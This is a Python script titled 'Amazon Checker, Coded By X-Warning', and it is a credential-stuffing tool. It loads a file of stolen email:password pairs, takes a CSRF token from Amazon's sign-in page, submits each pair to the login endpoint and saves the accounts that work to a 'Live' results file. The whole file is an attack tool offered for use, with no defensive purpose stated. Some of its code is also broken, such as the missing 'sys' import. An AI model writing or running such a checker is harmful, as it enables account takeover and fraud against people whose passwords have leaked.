import requests
import os
import re
from colorama import Fore, Style, init

# ----------------------------------------------------------------------
# Initialise colourama and clear screen
# ----------------------------------------------------------------------
init()
os.system('cls' if os.name == 'nt' else 'clear')

# ----------------------------------------------------------------------
# Banner
# ----------------------------------------------------------------------
print('_' * 50)
print('        Amazon Checker')
print('        Coded By X-Warning')
print('_' * 50)
print()

# ----------------------------------------------------------------------
# Helper: fetch the login page and extract CSRF token
# ----------------------------------------------------------------------
def get_csrf_token():
    """
    GET the Amazon sign‑in page and return the CSRF token value.
    Returns None on failure.
    """
    url = 'https://www.amazon.com/ap/signin'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        resp = requests.get(url, headers=headers)
        # Look for <input name="csrf_token" value="...">
        match = re.search(r'<input\s+name="csrf_token"\s+value="([^"]+)"', resp.text)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        print(Fore.RED + f'Error fetching login page: {e}' + Style.RESET_ALL)
        return None

# ----------------------------------------------------------------------
# Helper: check a single combo (email:password)
# ----------------------------------------------------------------------
def check_combo(combo, csrf_token):
    """
    Attempt to log in with the given combo.
    Returns True if login appears successful, False otherwise.
    """
    email, password = combo.strip().split(':', 1)
    url = 'https://www.amazon.com/ap/signin'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://www.amazon.com/ap/signin'
    }
    data = {
        'email': email,
        'password': password,
        'csrf_token': csrf_token,
        'openid.pape.max_auth_age': '0',
        'openid.return_to': 'https://www.amazon.com/dp/B07Z8PWC6R/?_encoding=UTF8&ref_=nav_newcust',
        'openid.identity': 'http://specs.openid.net/auth/2.0/identifier_select',
        'openid.assoc_handle': 'usflex',
        'openid.mode': 'checkid_setup',
        'openid.claimed_id': 'http://specs.openid.net/auth/2.0/identifier_select',
        'openid.ns': 'http://specs.openid.net/auth/2.0'
    }

    try:
        resp = requests.post(url, headers=headers, data=data, allow_redirects=True)
        # Successful login usually redirects to the account page or shows "Your Account"
        if resp.status_code == 200:
            # Check for known success markers
            if 'Sign in' not in resp.text and 'Your Account' in resp.text:
                return True
            # Sometimes Amazon redirects; follow redirects automatically via allow_redirects=True
            # If final URL contains '/ap/account' we consider it success
            if 'ap/account' in resp.url:
                return True
        return False
    except Exception as e:
        print(Fore.RED + f'Error checking {combo}: {e}' + Style.RESET_ALL)
        return False

# ----------------------------------------------------------------------
# Main workflow
# ----------------------------------------------------------------------
def main():
    # Ensure results directory exists
    os.makedirs('Results', exist_ok=True)

    # Input file containing combos (one per line, format: email:password)
    list_file = input(Fore.YELLOW + '[+] Input Mail List (e.g. combos.txt): ' + Style.RESET_ALL).strip()
    if not os.path.isfile(list_file):
        print(Fore.RED + f'File not found: {list_file}' + Style.RESET_ALL)
        return

    # Pre‑fetch CSRF token once (required for POST)
    csrf = get_csrf_token()
    if not csrf:
        print(Fore.RED + 'Could not retrieve CSRF token – aborting.' + Style.RESET_ALL)
        return

    # Open output files
    live_file = open('Results/Live.txt', 'w', encoding='utf-8')
    dead_file = open('Results/Die.txt', 'w', encoding='utf-8')

    print('-' * 50)
    total = sum(1 for _ in open(list_file, 'r', encoding='utf-8'))
    processed = 0

    with open(list_file, 'r', encoding='utf-8') as f:
        for line in f:
            combo = line.strip()
            if not combo:
                continue

            processed += 1
            print(f'[{processed}/{total}] Checking: {combo}', end='\r')

            if check_combo(combo, csrf):
                print(Fore.GREEN + f'[LIVE]   {combo}' + Style.RESET_ALL)
                live_file.write(combo + '\n')
            else:
                print(Fore.RED + f'[DIE]    {combo}' + Style.RESET_ALL)
                dead_file.write(combo + '\n')

    # Cleanup
    live_file.close()
    dead_file.close()
    print('\n' + '-' * 50)
    print(Fore.CYAN + 'Processing complete.' + Style.RESET_ALL)
    print(f'Valid combos saved to: {Fore.GREEN}Results/Live.txt{Style.RESET_ALL}')
    print(f'Invalid combos saved to: {Fore.RED}Results/Die.txt{Style.RESET_ALL}')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + '\nInterrupted by user.' + Style.RESET_ALL)
        sys.exit(0)
